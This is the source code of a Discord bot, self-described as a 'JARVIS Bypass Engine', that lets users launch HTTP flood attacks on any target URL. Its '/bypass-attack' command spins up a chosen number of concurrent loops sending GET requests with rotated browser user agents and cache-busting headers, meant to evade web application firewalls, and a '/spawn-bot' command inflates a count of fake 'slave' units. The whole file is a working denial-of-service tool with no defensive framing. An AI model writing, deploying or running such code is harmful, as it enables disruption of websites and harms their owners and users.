const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('JARVIS Bypass Engine is running.');
});

server.listen(PORT, () => console.log(`[+] Server running on port ${PORT}`));

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
];

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);
    const commands = [
        new SlashCommandBuilder()
            .setName('bypass-attack')
            .setDescription('Attack target with WAF bypass headers')
            .addStringOption(opt => opt.setName('target').setDescription('Target URL').setRequired(true))
            .addIntegerOption(opt => opt.setName('intensity').setDescription('Threads count').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('Duration in seconds').setRequired(true)),
        new SlashCommandBuilder()
            .setName('spawn-bot')
            .setDescription('Spawn virtual units')
            .addIntegerOption(opt => opt.setName('count').setDescription('Count').setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('Check units status')
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('[+] Slash commands registered.');
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] Units online: **${slaveNodes.length}**`, ephemeral: true });
    }

    if (interaction.commandName === 'spawn-bot') {
        const count = interaction.options.getInteger('count');
        for (let i = 0; i < count; i++) slaveNodes.push({ id: Math.random().toString(36).substring(7) });
        return interaction.reply({ content: `[🤖] Spawned **${count}** units. Total: **${slaveNodes.length}**`, ephemeral: true });
    }

    if (interaction.commandName === 'bypass-attack') {
        const target = interaction.options.getString('target');
        const intensity = interaction.options.getInteger('intensity');
        const duration = interaction.options.getInteger('duration');
        const targetUrl = target.startsWith('http') ? target : `http://${target}`;

        await interaction.reply(`[🔥] Attacking **${targetUrl}** with **${intensity}** threads for **${duration}s**!`);

        let active = true;
        setTimeout(() => { active = false; }, duration * 1000);

        const flood = async () => {
            while (active) {
                try {
                    await axios.get(targetUrl, {
                        timeout: 3000,
                        headers: {
                            'User-Agent': UAS[Math.floor(Math.random() * UAS.length)],
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Accept-Language': 'en-US,en;q=0.9'
                        }
                    });
                } catch (e) {}
            }
        };

        for (let i = 0; i < intensity; i++) flood();
    }
});

client.login(process.env.DISCORD_TOKEN);
